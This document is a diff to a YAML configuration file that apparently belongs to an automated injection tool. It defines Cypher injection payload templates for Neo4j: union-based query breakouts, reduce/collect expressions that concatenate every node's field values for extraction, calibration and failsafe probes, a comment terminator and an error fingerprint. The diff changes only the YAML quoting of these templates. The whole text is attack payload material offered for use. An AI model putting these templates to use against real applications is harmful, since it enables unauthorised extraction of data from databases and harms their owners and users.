@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   '' AS A LIMIT 0 UNION 
@@ -73,7 +73,7 @@ resource:
     RETURN 
         '${LEAD}' 
         %2b reduce(
-            b = \"\", 
+            b = "", 
             n IN collect(n) | 
             b 
             %2b '${ENCLOSE_VALUE_SQL}'
@@ -84,31 +84,31 @@ resource:
     AS A
     UNION MATCH (n:blah) RETURN n
    fields: 
-    field: "coalesce(n.${FIELD}, '')"
+    field: coalesce(n.${FIELD}, '')
     concat: "%2b '%7f' %2b"
     
 strategy: 
  configuration: 
-  slidingWindow: "${INJECTION}"
-  limit: "skip ${LIMIT} LIMIT 65536"
-  failsafe: "MATCH (n) RETURN 1337${INDICE}7330%2b1 AS A"
+  slidingWindow: ${INJECTION}
+  limit: skip ${LIMIT} LIMIT 65536
+  failsafe: MATCH (n) RETURN 1337${INDICE}7330%2b1 AS A
   calibrator: |
    '' AS A LIMIT 0 UNION 
    MATCH (n) 
    RETURN 
        '${LEAD}${INDICE}'
        %2b reduce(
-           a = \"\", 
+           a = "", 
            nn IN collect(n) | 
-           a %2b \"${CALIBRATOR_SQL}\"
+           a %2b "${CALIBRATOR_SQL}"
        )
   limitBoundary: 0
-  endingComment: "//"
+  endingComment: //
   fingerprint: 
    errorMessage: 
     - neo4j
     
  normal: 
-  indices: "RETURN 'A' AS A UNION ${INDICES}"
-  capacity: "${CALIBRATOR}"
-  orderBy: "ORDER BY 1337"
+  indices: RETURN 'A' AS A UNION ${INDICES}
+  capacity: ${CALIBRATOR}
+  orderBy: ORDER BY 1337
